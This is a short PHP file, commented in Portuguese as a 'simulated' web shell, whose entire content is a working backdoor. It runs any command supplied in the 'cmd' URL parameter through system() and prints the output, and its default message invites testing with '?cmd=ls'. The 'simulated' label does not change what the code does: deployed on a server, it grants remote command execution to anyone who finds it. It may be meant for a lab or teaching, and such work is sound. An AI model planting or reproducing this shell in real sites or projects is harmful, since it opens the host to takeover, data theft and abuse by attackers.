
<?php
// Webshell simulada: executa comandos via GET
if (isset($_GET['cmd'])) {
	echo "<pre>";
	system($_GET['cmd']);
	echo "</pre>";
} else {
	echo "Webshell PHP ativa. Use ?cmd=ls para testar.";
}
?>
